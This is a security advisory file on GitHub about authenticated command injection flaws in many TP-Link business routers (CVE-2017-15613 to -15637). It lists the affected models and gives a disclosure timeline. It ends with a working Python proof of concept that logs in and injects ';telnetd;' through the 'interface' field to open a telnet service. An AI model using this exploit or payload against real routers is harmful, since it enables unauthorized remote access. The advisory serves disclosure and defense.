=== Content from github.com_3d07ea0e_20250124_181340.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchunibalon%2FVulnerability%2Fblob%2Fmaster%2FCVE-2017-15613_to_CVE-2017-15637.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchunibalon%2FVulnerability%2Fblob%2Fmaster%2FCVE-2017-15613_to_CVE-2017-15637.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=chunibalon%2FVulnerability)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chunibalon](/chunibalon)
/
**[Vulnerability](/chunibalon/Vulnerability)**
Public

* [Notifications](/login?return_to=%2Fchunibalon%2FVulnerability) You must be signed in to change notification settings
* [Fork
  1](/login?return_to=%2Fchunibalon%2FVulnerability)
* [Star
   1](/login?return_to=%2Fchunibalon%2FVulnerability)

* [Code](/chunibalon/Vulnerability)
* [Issues
  0](/chunibalon/Vulnerability/issues)
* [Pull requests
  0](/chunibalon/Vulnerability/pulls)
* [Actions](/chunibalon/Vulnerability/actions)
* [Projects
  0](/chunibalon/Vulnerability/projects)
* [Security](/chunibalon/Vulnerability/security)
* [Insights](/chunibalon/Vulnerability/pulse)

Additional navigation options

* [Code](/chunibalon/Vulnerability)
* [Issues](/chunibalon/Vulnerability/issues)
* [Pull requests](/chunibalon/Vulnerability/pulls)
* [Actions](/chunibalon/Vulnerability/actions)
* [Projects](/chunibalon/Vulnerability/projects)
* [Security](/chunibalon/Vulnerability/security)
* [Insights](/chunibalon/Vulnerability/pulse)

## Files

 master
## Breadcrumbs

1. [Vulnerability](/chunibalon/Vulnerability/tree/master)
/
# CVE-2017-15613\_to\_CVE-2017-15637.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/chunibalon/Vulnerability/commits/master/CVE-2017-15613_to_CVE-2017-15637.txt)201 lines (166 loc) · 7.18 KB master
## Breadcrumbs

1. [Vulnerability](/chunibalon/Vulnerability/tree/master)
/
# CVE-2017-15613\_to\_CVE-2017-15637.txt

Top
## File metadata and controls

* Code
* Blame

201 lines (166 loc) · 7.18 KB[Raw](https://github.com/chunibalon/Vulnerability/raw/refs/heads/master/CVE-2017-15613_to_CVE-2017-15637.txt)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200Multiple vulnerabilities in TP-Link products(CVE-2017-15613 to CVE-2017-15637)
Introduction:================The WVR-, WAR- and ER- products are the SOHO/WIFI routers of TP-Link.These issues allow remote authenticated administrators to execute arbitrary commands via command injection through different variables of different lua files. If the attacker obtains the account and password of the router, then he can execute the arbitrary command through this command injection vulnerability. These vulnerabilities can be triggered in LAN and WAN(if the "remote management" function is enabled).
Vulnerability Type:================Command Injection (Authenticated)
Product:================We has tested these vulnerabilities on TL-WVR450L(the latest version is TL-WVR450L V1.0161125) and TL-WVR900G(TL-WVR900G V3.0\_170306).And the following model should also be affected and the vendor has confirmed:TP-Link ER5110G,TP-Link ER5120G,TP-Link ER5510G,TP-Link ER5520G,TP-Link R4149G,TP-Link R4239G,TP-Link R4299G,TP-Link R473GP-AC,TP-Link R473G,TP-Link R473P-AC,TP-Link R473,TP-Link R478G+,TP-Link R478,TP-Link R478+,TP-Link R483G,TP-Link R483,TP-Link R488,TP-Link WAR1300L,TP-Link WAR1750L,TP-Link WAR2600L,TP-Link WAR302,TP-Link WAR450L,TP-Link WAR450,TP-Link WAR458L,TP-Link WAR458,TP-Link WAR900L,TP-Link WVR1300G,TP-Link WVR1300L,TP-Link WVR1750L,TP-Link WVR2600L,TP-Link WVR300,TP-Link WVR302,TP-Link WVR4300L,TP-Link WVR450L,TP-Link WVR450,TP-Link WVR458L,TP-Link WVR900G,TP-Link WVR900L
CVE details:================The detail of each vulnerability are as follows:CVE-2017-15613: new-interface variable in the cmxddns.lua fileCVE-2017-15614: new-outif variable in the pptp\_client.lua fileCVE-2017-15615: lcpechointerval variable in the pptp\_client.lua fileCVE-2017-15616: new-interface variable in the phddns.lua fileCVE-2017-15617: iface variable in the interface\_wan.lua fileCVE-2017-15618: new-enable variable in the pptp\_client.lua fileCVE-2017-15619: pptphellointerval variable in the pptp\_client.lua fileCVE-2017-15620: new-zone variable in the ipmac\_import.lua fileCVE-2017-15621: olmode variable in the interface\_wan.lua fileCVE-2017-15622: new-mppeencryption variable in the pptp\_client.lua fileCVE-2017-15623: new-enable variable in the pptp\_server.lua fileCVE-2017-15624: new-authtype variable in the pptp\_server.lua fileCVE-2017-15625: new-olmode variable in the pptp\_client.lua fileCVE-2017-15626: new-bindif variable in the pptp\_server.lua fileCVE-2017-15627: new-pns variable in the pptp\_client.lua fileCVE-2017-15628: lcpechointerval variable in the pptp\_server.lua fileCVE-2017-15629: new-tunnelname variable in the pptp\_client.lua fileCVE-2017-15630: new-remotesubnet variable in the pptp\_client.lua fileCVE-2017-15631: new-workmode variable in the pptp\_client.lua fileCVE-2017-15632: new-mppeencryption variable in the pptp\_server.lua fileCVE-2017-15633: new-ipgroup variable in the session\_limits.lua fileCVE-2017-15634: name variable in the wportal.lua fileCVE-2017-15635: max\_conn variable in the session\_limits.lua fileCVE-2017-15636: new-time variable in the webfilter.lua fileCVE-2017-15637: pptphellointerval variable in the pptp\_server.lua file
Credits:================chunibalon, puzzor @VARAS of IIE
Timeline:================2017.08 to 2017.09: Issues found.2017.09.26: Vendor contacted.2017.10.13: Vendor confirmed.2017.10.14: CVE id requested.2017.10.19: CVE id assigned.2018.1: Vendor confirmed that all effected products have been fixed.
Vulnerability detail:================These vulnerability are caused by the similar reason, so here is an explanation of CVE-2017-15616. Other vulnerabilities can be reproduced with the detail descriptions of the variable and lua file.
In /usr/lib/lua/luci/controller/admin/phddns.lua file, line 113:\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*function add\_phddns(http\_form) local form\_data = json.decode(http\_form.data) local jdata = form\_data.params.new
 ret = form:insert(CONFIG\_NAME, "phddns", jdata, RULE\_KEYS, nil)
 if not ret then return false, err.ERR\_COM\_TABLE\_ITEM\_UCI\_ADD end
 if not uci\_r:commit(CONFIG\_NAME) then return false, err.ERR\_COM\_UCI\_COMMIT end
 -- add the ref of interface ifs.update\_if\_reference(jdata.interface, 1)
 sys.fork\_exec('/etc/init.d/phddns restart') userconfig.cfg\_modify()
 return jdataend\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*This file will process a POST request from the web management panel with url "ip/cgi-bin/luci/;stok=xxx/admin/phddns?form=phddns". The interface argument passed by the POST request can be set with the malformed command payload and the lua file didn't check the argument sufficiently. Then the malformed value of "interface" argument causes the command injection vulnerability.
PoC file:================\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*import requestsimport urllibimport json
# This is the PoC code of authenticated command injection of TP-Link WVR900G router with the CVE-2017-15616.# To reproduce the PoC, the ip of the router should be 192.168.123.1 and the password of web management panel should be 'adminadmin'
PASSWORD = 'c6564879eda92681404fb4ce64343788e47d266c490bb9d574f4467644a2f96b73ec157bbffabb50752c46f55d026ec7ef34661d7dcb030b0b1fa527173093ae4358f4740e539322f58c441ea0003978475346fb66320f749cc138f867bc0d8d9501f1613524fbba565979d95df6ef412837dee15a6dd8867d00b91c6f4a3406'BASEURL = 'http://192.168.123.1'LOGINURL = BASEURL + '/cgi-bin/luci/;stok=/login?form=login'
MARK = '###'VULURL = BASEURL + '/cgi-bin/luci/;stok=%s/admin/phddns?form=phddns' % (MARK)
headers = { "Accept": "application/json, text/javascript, \*/\*; q=0.01", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4", "Connection": "keep-alive", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": BASEURL[7:], "Origin": BASEURL, "Referer": "%s/webpages/login.html" % (BASEURL), "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_12\_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36", "X-Requested-With": "XMLHttpRequest"}
login\_data\_value = {'method': 'login','params': {'password': PASSWORD,'username': 'admin'}}login\_data = {'data':json.dumps(login\_data\_value)}s = requests.Session()s.headers.update(headers)print (LOGINURL)print (login\_data)res = s.post(LOGINURL, data=login\_data)stok = eval(res.text)['result']['stok']print '[\*] stok is %s' % (stok)
tmp\_vul = VULURL.replace(MARK, stok)print '[\*] vul\_url is %s ' % (tmp\_vul)
delete\_data = {"method":"delete","params":{"key":"key-0","index":"0"}}delete\_data = {'data': json.dumps(delete\_data)}print '[+] delete existed rule'res = s.post(tmp\_vul, data=delete\_data)print '[\*] response is: %s' % (res.text)
# after executing this payload, the router will open its telnetd service.payload = ''';telnetd;'''vul\_data = {"method":"add","params":{"index":0,"old":"add","new":{"interface":"WAN1%s" % (payload),"name":"test1","passwd":"test","enable":"on"},"key":"add"}}
vul\_data = {'data': json.dumps(vul\_data)}print '[+] sending payload'res = s.post(tmp\_vul, data=vul\_data)print '[\*] response is: %s' % (res.text)\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


